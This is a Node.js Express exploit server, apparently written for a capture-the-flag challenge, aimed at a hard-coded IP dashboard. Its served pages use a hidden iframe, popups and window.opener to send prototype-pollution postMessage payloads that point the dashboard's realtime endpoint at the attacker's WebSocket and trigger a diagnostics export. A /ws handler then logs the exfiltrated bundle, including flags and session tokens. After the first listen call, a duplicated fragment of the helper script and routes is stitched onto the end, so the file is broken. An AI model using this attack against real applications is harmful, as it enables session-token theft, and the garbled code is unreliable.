const express = require('express');
const expressWs = require('express-ws');

const app = express();
expressWs(app);

const PORT = process.env.PORT || 10000;
const TARGET = 'http://34.118.127.209:35666/';

// ── GET / ── Landing: iframe dashboard + multiple fallback vectors ──
app.get('/', (req, res) => {
  const host = req.headers.host || req.hostname;
  const wsUrl = 'wss://' + host + '/ws';
  res.type('html').send(`<!DOCTYPE html>
<html><body>

<!-- ATTACK VECTOR 1: iframe the HTTP dashboard (works if bot has --allow-running-insecure-content) -->
<iframe id="dash" src="${TARGET}" style="width:1px;height:1px;position:absolute;top:-9999px"></iframe>

<script>
function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}

L('land|hist='+history.length+'|opener='+(window.opener?'Y':'N')+'|ua='+navigator.userAgent.slice(0,80));

var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');

// ═══ VECTOR 1: iframe ═══
var dashFrame = document.getElementById('dash');

dashFrame.addEventListener('load', function(){
  L('iframe_loaded');
});

function attackIframe(){
  if(!dashFrame || !dashFrame.contentWindow) return;
  // Check if iframe loaded (cross-origin = can't access .location but can postMessage)
  try{
    var loc = dashFrame.contentWindow.location.href;
    L('iframe_same='+loc);
  }catch(e){
    L('iframe_cross'); // cross-origin = dashboard loaded!
  }
  try{L('iframe_len='+dashFrame.contentWindow.length);}catch(e){L('iframe_len_err');}

  // Send pollution
  try{
    dashFrame.contentWindow.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
    L('i_pollute');
  }catch(e){L('i_pollute_err='+e.message);}

  // Trigger diagnostics export after delay
  setTimeout(function(){
    try{
      dashFrame.contentWindow.postMessage({type:'diagnostics:export'},'*');
      L('i_trigger');
    }catch(e){L('i_trigger_err='+e.message);}
  },600);
}

// Multiple rounds for iframe (give it time to load)
[2000,4000,6000,8000,11000,15000].forEach(function(d){setTimeout(attackIframe,d);});

// ═══ VECTOR 2: window.opener (if bot opened us from dashboard context) ═══
if(window.opener){
  L('HAS_OPENER');
  try{L('opener_loc='+window.opener.location.href);}catch(e){L('opener_cross');}
  try{L('opener_len='+window.opener.length);}catch(e){}

  function attackOpener(){
    try{
      window.opener.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
      window.opener.postMessage({type:'diagnostics:export'},'*');
      L('op_attack');
    }catch(e){}
  }
  [500,2000,4000,7000].forEach(function(d){setTimeout(attackOpener,d);});
}

// ═══ VECTOR 3: popup dashboard ═══
var pop=null;
try{pop=window.open('${TARGET}');L('pop='+(pop?'ok':'null'));}catch(e){L('pop_err');}

function attackPop(){
  if(!pop||pop.closed)return;
  try{L('p_len='+pop.length);}catch(e){}
  try{
    pop.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
    setTimeout(function(){pop.postMessage({type:'diagnostics:export'},'*');L('p_trigger');},500);
  }catch(e){}
}
[3000,6000,10000,14000].forEach(function(d){setTimeout(attackPop,d);});

// ═══ VECTOR 4: helper popup + history.back ═══
var helper=window.open('/helper');
L('helper='+(helper?'ok':'null'));
if(history.length>1){
  L('going_back');
  setTimeout(function(){history.back();},400);
}
</script>
</body></html>`);
});

// ── GET /helper ── Popup that attacks window.opener ──
app.get('/helper', (req, res) => {
  const host = req.headers.host || req.hostname;
  const wsUrl = 'wss://' + host + '/ws';
  res.type('html').send(`<!DOCTYPE html>
<html><body>
<script>
function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}
L('helper_loaded');

var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');

function attack(){
  if(!window.opener){L('h_no_opener');return;}
  try{window.opener.location.href;L('h_same');}catch(e){L('h_cross');}
  try{L('h_len='+window.opener.length);}catch(e){L('h_len_err');}

  try{
    window.opener.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
    L('h_pollute');
  }catch(e){}
  setTimeout(function(){
    try{
      window.opener.postMessage({type:'diagnostics:export'},'*');
      L('h_trigger');
    }catch(e){}
  },600);
}

var n=0;
var iv=setInterval(function(){
  n++;attack();L('h_att_'+n);
  if(n>=15)clearInterval(iv);
},2000);
</script>
</body></html>`);
});

// ── POST /log ── accept sendBeacon ──
app.post('/log', (req, res) => {
  console.log('[beacon:post]', req.originalUrl);
  res.status(204).end();
});

// ── GET /log ── beacon logger ──
app.get('/log', (req, res) => {
  var raw = req.originalUrl.replace(/^\/log\?/,'').replace(/&_=\d+$/,'');
  console.log('[beacon]', decodeURIComponent(raw));
  res.status(204).end();
});

// ── WS /ws ── receive exfiltrated diagnostics ──
app.ws('/ws', (ws, req) => {
  console.log('[ws] connection from', req.ip);
  ws.on('message', (data) => {
    console.log('\\n' + '='.repeat(62));
    console.log('  EXFILTRATED DIAGNOSTICS BUNDLE');
    console.log('='.repeat(62));
    try {
      const d = JSON.parse(data);
      console.log(JSON.stringify(d, null, 2));
      const s = d.session || {};
      if (s.flag) console.log('\\n  >>> FLAG  =', s.flag);
      if (s.token) console.log('  >>> TOKEN =', s.token);
    } catch(e) {
      console.log(String(data).slice(0, 2000));
    }
    console.log('='.repeat(62) + '\\n');
  });
  ws.on('close', () => console.log('[ws] closed'));
});

app.listen(PORT, () => {
  console.log('Listening on port', PORT);
});
  try{
    var dw=window.open('','dashwin');
    if(dw&&dw!==window&&dw!==window.opener){
      L('h_dashwin');
      dw.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
      setTimeout(function(){dw.postMessage({type:'diagnostics:export'},'*');},500);
    }
  }catch(e){}
}

var n=0;
var iv=setInterval(function(){
  n++;attack();L('h_att_'+n);
  if(n>=20)clearInterval(iv);
},2000);
</script>
</body></html>`);
});

// ── POST /log ── accept sendBeacon (POST) too ──
app.post('/log', (req, res) => {
  console.log('[beacon:post]', req.originalUrl);
  res.status(204).end();
});

// ── GET /log ── beacon logger ──
app.get('/log', (req, res) => {
  var raw = req.originalUrl.replace(/^\/log\?/,'').replace(/&_=\d+$/,'');
  console.log('[beacon]', decodeURIComponent(raw));
  res.status(204).end();
});

// ── WS /ws ── receive exfiltrated diagnostics ──
app.ws('/ws', (ws, req) => {
  console.log('[ws] connection from', req.ip);
  ws.on('message', (data) => {
    console.log('\n' + '='.repeat(62));
    console.log('  EXFILTRATED DIAGNOSTICS BUNDLE');
    console.log('='.repeat(62));
    try {
      const d = JSON.parse(data);
      console.log(JSON.stringify(d, null, 2));
      const s = d.session || {};
      if (s.flag) console.log('\n  >>> FLAG  =', s.flag);
      if (s.token) console.log('  >>> TOKEN =', s.token);
    } catch(e) {
      console.log(String(data).slice(0, 2000));
    }
    console.log('='.repeat(62) + '\n');
  });
  ws.on('close', () => console.log('[ws] closed'));
});

app.listen(PORT, () => {
  console.log('Listening on port', PORT);
});
